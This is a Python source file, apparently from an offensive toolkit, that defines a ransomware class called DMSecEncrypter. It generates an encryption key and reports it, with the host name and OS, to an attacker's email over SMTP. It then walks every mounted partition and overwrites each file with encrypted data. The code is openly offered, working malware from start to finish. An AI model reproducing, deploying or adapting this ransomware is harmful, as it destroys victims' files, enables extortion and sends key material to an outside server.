from cryptography.fernet import Fernet
from os import walk, environ
from os.path import join
from psutil import disk_partitions
from pyhtools.evil_files.malwares.utils import send_mail


class DMSecEncrypter:
    def __init__(self, paths: list = None, email: str = None, passwd: str = None, smtp_server: str = 'smtp.gmail.com', smtp_port: int = 587) -> None:
        # generate new key
        self.KEY = Fernet.generate_key()
        message = f'Subject: RNSMWARE ATTK has been initialized on {environ.get("COMPUTERNAME", None)}\n**KEY** {str(self.KEY, encoding="utf-8")}\n**OS** {environ.get("OS", None)}\n\n'

        # report KEY to the attacker using email
        if email != None and passwd != None and send_mail(email=email, password=passwd, receiver_mail=email, smtp_server=smtp_server, smtp_port=smtp_port):
            pass
        else:
            # print error message and exit if key is not sent
            print('[!] Try Again, Unable to connect')
            exit()

        # generate fernet obj for file encryption
        self.fernet = Fernet(self.KEY)

        if paths == None:
            self.PATHS = self.__get_partitions_path()
        else:
            self.PATHS = paths

    def __get_partitions_path(self) -> list:
        '''
        returns all mounted partition's mount points as a list
        '''
        mount_points = []
        for partition in disk_partitions():
            mount_points.append(partition.mountpoint)
        return mount_points

    def encrypt_file(self, file_path):
        try:
            # read file data
            with open(file_path, 'rb') as f:
                file_data = f.read()

            # encrypt file data
            enc_data = self.fernet.encrypt(file_data)

            # write file data
            with open(file_path, 'wb') as f:
                file_data = f.write(enc_data)
            return True

        except Exception:
            return False

    def encrypt_files(self, path: str):
        for root, dirs, files in walk(path):
            for file in files:
                file_path = join(root, file)
                self.encrypt_file(file_path=file_path)

    def start(self):
        for path in self.PATHS:
            self.encrypt_files(path)
